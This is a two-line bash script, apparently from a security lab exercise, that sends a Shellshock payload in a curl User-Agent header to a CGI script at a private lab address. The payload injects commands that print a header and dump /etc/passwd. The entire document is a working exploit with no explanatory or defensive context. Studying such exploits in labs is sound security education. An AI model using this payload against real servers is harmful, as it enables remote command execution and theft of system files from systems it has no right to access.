#!/bin/bash

curl -A "() { echo hello wdnmd;}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" 10.9.0.80/cgi-bin/vul.cgi
